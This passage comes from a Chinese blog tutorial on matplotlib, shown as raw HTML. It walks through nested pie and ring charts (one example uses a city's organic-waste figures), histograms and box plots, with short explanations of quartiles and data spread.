plt<span class="token punctuation">.</span>get_cmap<span class="token punctuation">(</span><span class="token string">"tab20c"</span><span class="token punctuation">)</span>cmap_b <span class="token operator">=</span> plt<span class="token punctuation">.</span>get_cmap<span class="token punctuation">(</span><span class="token string">"tab20b"</span><span class="token punctuation">)</span><span class="token comment"># 使用tab20c的全部颜色和tab20b中的 5至8 颜色</span>cmap_1 <span class="token operator">=</span> cmap_c<span class="token punctuation">(</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>cmap_2 <span class="token operator">=</span> cmap_b<span class="token punctuation">(</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 内圈的颜色是每4个颜色中色彩最深的那个. vstack是将两类颜色叠加在一起</span>inner_colors <span class="token operator">=</span> np<span class="token punctuation">.</span>vstack<span class="token punctuation">(</span><span class="token punctuation">(</span>cmap_1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cmap_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 外圈的颜色是全部24种颜色</span>outer_colors <span class="token operator">=</span> np<span class="token punctuation">.</span>vstack<span class="token punctuation">(</span><span class="token punctuation">(</span>cmap_1<span class="token punctuation">,</span> cmap_2<span class="token punctuation">)</span><span class="token punctuation">)</span>labels_first <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"餐厨废弃物\n&#123;&#125;万吨"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>vals_inner<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"农业秸秆\n&#123;&#125;万吨"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>vals_inner<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"水草\n151.2万吨"</span><span class="token punctuation">,</span>                <span class="token string">"园林绿化\n废弃物\n&#123;&#125;万吨"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>vals_inner<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"淤泥\n432.0万吨"</span><span class="token punctuation">,</span>                <span class="token string">"畜禽粪便\n21.6万吨"</span>                <span class="token punctuation">]</span>labels_seocnd <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"未分类收集\n67.6万吨"</span><span class="token punctuation">,</span>    <span class="token string">"生物干化\n3.7万吨"</span><span class="token punctuation">,</span>    <span class="token string">"厌氧发酵\n10.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"油水分离\n2.6万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"粉碎\n46.8万吨"</span><span class="token punctuation">,</span>    <span class="token string">"好氧发酵\n3.5万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未处理\n4.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"藻水分离\n147.0万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未处理\n1.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"粉碎\n7.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"堆放\n432.0万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未处理\n0.7万吨"</span><span class="token punctuation">,</span>    <span class="token string">"好氧发酵\n19.9万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span><span class="token punctuation">]</span>labels_third <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"未处理\n67.5万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化、发电\n3.7万吨"</span><span class="token punctuation">,</span>    <span class="token string">"沼气、沼渣发电\n10.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"焚烧\n2.6万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"还田\n42.6万吨"</span><span class="token punctuation">,</span>    <span class="token string">"燃料化\n4.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化\n3.5万吨"</span><span class="token punctuation">,</span>    <span class="token string">"未利用\n4.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"燃料化\n80.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化\n66.8万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未利用\n1.2万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化\n5.8万吨"</span><span class="token punctuation">,</span>    <span class="token string">"燃料化\n1.4万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未利用\n432.0万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"未利用\n0.7万吨"</span><span class="token punctuation">,</span>    <span class="token string">"肥料化\n19.9万吨"</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">""</span><span class="token punctuation">,</span><span class="token punctuation">]</span>handles<span class="token punctuation">,</span> labels <span class="token operator">=</span> ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals_first<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span> size <span class="token operator">-</span> size<span class="token punctuation">,</span>                         labels<span class="token operator">=</span>labels_first<span class="token punctuation">,</span>                         labeldistance<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> rotatelabels<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'fontsize'</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                         colors<span class="token operator">=</span>inner_colors<span class="token punctuation">,</span> wedgeprops<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>width<span class="token operator">=</span>size<span class="token punctuation">,</span> edgecolor<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals_second<span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">-</span> size<span class="token punctuation">,</span> colors<span class="token operator">=</span>outer_colors<span class="token punctuation">,</span>       labels<span class="token operator">=</span>labels_seocnd<span class="token punctuation">,</span>       labeldistance<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">,</span> rotatelabels<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'fontsize'</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>       wedgeprops<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>width<span class="token operator">=</span>size<span class="token punctuation">,</span> edgecolor<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals_third<span class="token punctuation">.</span>flatten<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> colors<span class="token operator">=</span>outer_colors<span class="token punctuation">,</span>       labels<span class="token operator">=</span>labels_third<span class="token punctuation">,</span>       labeldistance<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span> rotatelabels<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> textprops<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'fontsize'</span><span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>       wedgeprops<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>width<span class="token operator">=</span>size<span class="token punctuation">,</span> edgecolor<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'某市有机废弃物产生、处理、利用情况'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>handles<span class="token operator">=</span>handles<span class="token punctuation">,</span> labels<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token string">"餐厨废弃物"</span><span class="token punctuation">,</span>    <span class="token string">"农业秸秆"</span><span class="token punctuation">,</span>    <span class="token string">"水草"</span><span class="token punctuation">,</span>    <span class="token string">"园林绿化废弃物"</span><span class="token punctuation">,</span>    <span class="token string">"淤泥"</span><span class="token punctuation">,</span>    <span class="token string">"畜禽粪便"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>           loc<span class="token operator">=</span><span class="token number">1</span>           <span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_20.png"></p><p>这个例子来源于CSDN不是我自己写的，权拿过来做一个参考。</p><p>下面写个简单的</p><p>目前matplotlib的官方文档中尚无双层饼图绘制的专门介绍<del>我那个渣渣的英语即使有也多半找不到</del>，但是pie（）函数中有个饼图半径的设置<strong>radius</strong>，我们可以通过手动规定饼图半径，pie()由于是通过一层一层的堆叠，后面一层覆盖掉前面的层次，我们可以这样来实现两张图片的堆叠。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltvals1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>vals2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token punctuation">)</span>labels <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals1<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1.2</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals2<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>aspect<span class="token operator">=</span><span class="token string">"equal"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进一步实现环图，这也是这个道理，使用一张纯白的饼图去覆盖上两张图片就能实现多层嵌套饼图</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltvals1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>vals2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>vals3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token punctuation">)</span>labels <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals1<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1.2</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals2<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals3<span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">,</span>radius<span class="token operator">=</span><span class="token number">0.7</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>aspect<span class="token operator">=</span><span class="token string">"equal"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_31.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltmatplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'SimHei'</span>vals1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>vals2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>vals3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>fig<span class="token punctuation">,</span> ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span><span class="token punctuation">)</span>labels <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals1<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1.2</span><span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%1.1f%%'</span><span class="token punctuation">,</span>pctdistance<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals2<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%1.1f%%'</span><span class="token punctuation">,</span>pctdistance<span class="token operator">=</span><span class="token number">0.75</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>vals3<span class="token punctuation">,</span> radius<span class="token operator">=</span><span class="token number">0.6</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">)</span>ax<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span>aspect<span class="token operator">=</span><span class="token string">"equal"</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'多层嵌套饼图'</span><span class="token punctuation">)</span><span class="token comment">#plt.legend()</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span>labels<span class="token punctuation">,</span>bbox_to_anchor<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> loc<span class="token operator">=</span><span class="token string">'best'</span><span class="token punctuation">,</span> borderaxespad<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_32.png"></p><h2 id="5-7-直方图"><a href="#5-7-直方图" class="headerlink" title="5.7 直方图"></a>5.7 直方图</h2><p>在数据分析应用中，直方图是一种对数据分布情况进行表达的数据可视化形式，其横坐标通常表示统计样本，纵坐标表示某个样本对应的某个属性的度量值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span> bins<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> density<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltfigure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>axes1 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>axes2 <span class="token operator">=</span> figure<span class="token punctuation">.</span>add_subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token comment">#在0到100的范围内，随机生成五十个随机数,</span>axes1<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">)</span>axes2<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span>bins<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token builtin">range</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span>histtype<span class="token operator">=</span><span class="token string">'barstacked'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token comment">#这个实际上频率分布直方图，y坐标是x在一定范围内出现的次数</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_21.png"></p><h2 id="5-8-箱线图"><a href="#5-8-箱线图" class="headerlink" title="5.8 箱线图"></a>5.8 箱线图</h2><p>箱线图又称为盒式图、盒状图或箱形图，是一种用于显示一组数据分散情况资料的统计图。箱线图一般不受异常值的影响，是一种相对稳定的数据离散分布情况的描述方式。箱线图中显示的是一组数据的最大值、最小值、中位数、上下四分位数及异常值。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/箱线图.png" alt="1636276528346" style="zoom:50%;" /><p>将整组数据等分成4份，就是四分位数，四分位数有3个<br>第1个四分位数就是通常所说的四分位数，称为下四分位数，通常用Q1表示，等于整组数据中所有数值由小到大排列后第25%的数字，第2个四分位数是中位数，用Q2表示，等于整组数据中所有数值由小到大排列后第50%的数字，第3个四分位数是上四分位数，用Q3表示，等于整组数据中所有数值由小到大排列后第75%的数字</p><p>箱线图的大小是由数据升序排列后，中间的50%个数据决定的。因此，前25%数据和后25%数据都无法影响箱线图，它们可以变得任意远，且不会扰动四分位值。若数据集呈标准正态分布，则中位数位于Q1和Q3中间，箱线图的中间线恰好位于上底和下底的正中央。若中位数偏向于下底，则数据集倾向于左偏态；若中位数偏向于上底，则数据集倾向于右偏态。箱线图的宽度在一定程度上反映了数据的波动程度。因为箱线图包含中间50%的数据，若它越扁，则说明数据较为集中，若它越宽，则说明数据越分散。</p><p>可以通过观察中位线位于箱体的哪个部分判断数据分布是否均匀，如果中位线位于箱体的中心位置附近则数据部比较均匀，反之则不均匀。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>boxplot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> notch<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> sym<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vert<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> whis<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> positions<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> widths<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> patch_artist<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> meanline<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> showmeans<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> showcaps<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> showbox<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> showfliers<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> boxprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> labels<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> flierprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> medianprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> meanprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> capprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> whiskerprops<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>例5-23</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>boxplot<span class="token punctuation">(</span>x<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>横版5-23：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>boxplot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>vert <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2021/11/06/python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_22.png"></p><p>例5-24：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>x2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span>x3<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>boxplot<span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>x3<span class="token punctuation">)</span><span class="token punctuation">,</span>labels<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'x1'</span><span class="token punctuation">,</span><span class="token string">'x2'</span><span class="token punctuation">,</span><span class="token string">'x3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img 